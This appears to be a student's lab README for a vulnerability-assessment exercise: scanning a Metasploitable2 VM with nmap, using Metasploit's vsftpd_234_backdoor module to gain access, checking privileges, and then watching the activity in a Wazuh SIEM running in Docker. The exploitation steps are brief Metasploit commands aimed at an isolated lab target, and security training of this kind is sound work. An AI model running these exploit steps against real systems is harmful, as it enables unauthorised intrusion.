# Week 2 - Vulnerability Assessment and SIEM Monitoring

## Objective
This project demonstrates vulnerability scanning, exploitation, and SIEM monitoring using:

- Kali Linux
- Metasploitable2
- Nmap
- Metasploit Framework
- Wazuh SIEM
- Docker

---

# Workflow

## Step 1: Network Configuration
- Configure Kali Linux and Metasploitable2 in Host-Only Network
- Verify IP addresses using:
  ```bash
  ip addr
  
Step 2: Port Scanning

-Scan target machine using:

-nmap 192.168.56.101

-Identify open ports and services.

Step 3: Vulnerability Identification

-Search for vulnerabilities using Metasploit:

-search vsftpd

Step 4: Exploitation

-Configure exploit module:

-use exploit/unix/ftp/vsftpd_234_backdoor

-Execute exploit:

-exploit

Step 5: Privilege Verification

-Verify access level:

-getuid

Step 6: Wazuh SIEM Setup

-Verify Docker installation:

-docker --version

-Start Wazuh dashboard and agent.

Step 7: Monitoring and Logging

-View connected agents

-Monitor security events

-Analyze generated alerts
